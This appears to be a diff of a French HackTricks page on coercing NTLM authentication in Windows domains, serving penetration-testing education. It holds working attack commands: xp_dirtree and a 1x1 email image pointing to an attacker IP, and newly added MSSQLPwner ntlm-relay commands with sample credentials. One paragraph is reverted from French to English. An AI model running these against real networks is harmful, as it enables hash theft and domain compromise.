@@ -22,7 +22,7 @@ Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt=
 ## Abus du service Spooler
 
 Si le service _**Print Spooler**_ est **activé**, vous pouvez utiliser des identifiants AD déjà connus pour **demander** au serveur d'impression du contrôleur de domaine une **mise à jour** sur les nouvelles tâches d'impression et simplement lui dire de **envoyer la notification à un système**.\
-Notez que lorsque l'imprimante envoie la notification à des systèmes arbitraires, elle doit **s'authentifier contre** ce **système**. Par conséquent, un attaquant peut faire en sorte que le service _**Print Spooler**_ s'authentifie contre un système arbitraire, et le service **utilisera le compte d'ordinateur** dans cette authentification.
+Notez que lorsque l'imprimante envoie la notification à des systèmes arbitraires, elle doit **s'authentifier contre** ce **système**. Par conséquent, un attaquant peut faire en sorte que le service _**Print Spooler**_ s'authentifie contre un système arbitraire, et le service utilisera **le compte d'ordinateur** dans cette authentification.
 
 ### Trouver des serveurs Windows sur le domaine
 
@@ -78,6 +78,17 @@ C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -S
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 ```
+[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
+```shell
+# Issuing NTLM relay attack on the SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on the local server with custom command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
+```
 Ou utilisez cette autre technique : [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
@@ -90,7 +101,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Via email
 
-Si vous connaissez l'**adresse email** de l'utilisateur qui se connecte à une machine que vous souhaitez compromettre, vous pourriez simplement lui envoyer un **email avec une image 1x1** telle que
+If you know the **email address** of the user that logs inside a machine you want to compromise, you could just send him an **email with a 1x1 image** such as
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -104,8 +115,8 @@ Si vous pouvez effectuer une attaque MitM sur un ordinateur et injecter du HTML 
 ```
 ## Cracking NTLMv1
 
-Si vous pouvez capturer [les défis NTLMv1 lisez ici comment les cracker](../ntlm/#ntlmv1-attack).\
-_Rappelez-vous que pour cracker NTLMv1, vous devez définir le défi Responder sur "1122334455667788"_
+Si vous pouvez capturer [les défis NTLMv1 lisez ici comment les craquer](../ntlm/#ntlmv1-attack).\
+_Rappelez-vous que pour craquer NTLMv1, vous devez définir le défi Responder sur "1122334455667788"_
 
 {% hint style="success" %}
 Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -115,8 +126,8 @@ Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt=
 
 <summary>Soutenir HackTricks</summary>
 
-* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
